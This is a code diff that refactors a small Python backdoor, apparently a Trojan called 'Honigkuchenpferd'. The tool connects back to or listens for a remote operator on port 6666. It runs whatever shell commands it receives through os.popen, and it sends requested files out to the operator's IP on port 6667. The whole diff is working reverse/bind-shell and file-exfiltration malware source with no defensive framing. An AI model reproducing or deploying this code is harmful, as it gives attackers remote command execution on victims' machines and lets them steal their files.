@@ -37,29 +37,35 @@ class tcp_socket():
     def close(self):
         self.conn.close()
 
+def get_conn(PORT):
+    x = tcp_socket()
 
+    if REVERSE == True:
+        x.connect_to(IP, PORT)
+    else:
+        x.listen_on(PORT)
+
+    return(x)
+        
 def easy_exec(cmd):
     try:
         return os.popen(cmd).read()
     except:
         return "input error"
 
+    
 def easy_chdir(s):
     try:
         os.chdir(s)
     except:
         pass
     
+    
 def easy_file_send(filename, IP):
-    if REVERSE == True:
-        xf = tcp_socket()
-        xf.connect_to(IP, 6667)
-        xf.send_file(filename)
-    else:
-        xf = tcp_socket()
-        xf.listen_on(6667)
-        xf.send_file(filename)
+    xf = get_conn(6667)
+    xf.send_file(filename)
 
+        
 # python2.7 and python3
 def to_bytes(s):
     if sys.version_info[0] < 3:
@@ -67,6 +73,7 @@ def to_bytes(s):
     else:
         return bytes(s, 'utf-8')
 
+    
 # python2.7 and python3
 def to_str(s):
     if sys.version_info[0] < 3:
@@ -74,36 +81,30 @@ def to_str(s):
     else:
         return str(s, 'utf-8')
 
+    
 def easy_cmd(conn):
+    cmd = to_str(conn.recive_data())
+    if cmd.startswith('cd'):
+        easy_chdir(cmd[3:len(cmd) - 1])
+    elif cmd.startswith('download'):
+        easy_file_send(cmd[9:len(cmd)-1], IP)
+    elif cmd == "exit\n":
+        conn.close()
+        exit()
+    else:
+        conn.send_data(to_bytes(easy_exec(cmd)))
+
+        
+def honigkuchen():
+    conn = get_conn(6666)
     conn.send_data(to_bytes('hello from the other side :)\n'))
     while 1:
         conn.send_data(to_bytes(str('[Honigkuchenpferd ' + os.getcwd() + '] ')))
-        cmd = to_str(conn.recive_data())
-        if cmd.startswith('cd'):
-            easy_chdir(cmd[3:len(cmd) - 1])
-        elif cmd.startswith('download'):
-            easy_file_send(cmd[9:len(cmd)-1], IP)
-        elif cmd == "exit\n":
-            conn.close()
-            exit()
-        else:
-            conn.send_data(to_bytes(easy_exec(cmd)))
-
-def reverse_shell(IP, PORT):
-    x = tcp_socket()
-    x.connect_to(IP, PORT)
-    easy_cmd(x)
-
-def bind_shell(PORT):
-    x = tcp_socket()
-    x.listen_on(PORT)
-    easy_cmd(x)
-
+        easy_cmd(conn)
+        
+        
 if __name__ == '__main__':
-    if REVERSE == True:
-        reverse_shell(IP, 6666)
-    else:
-        bind_shell(6666)
+    honigkuchen()
     
 '''
     if len(sys.argv) > 3:
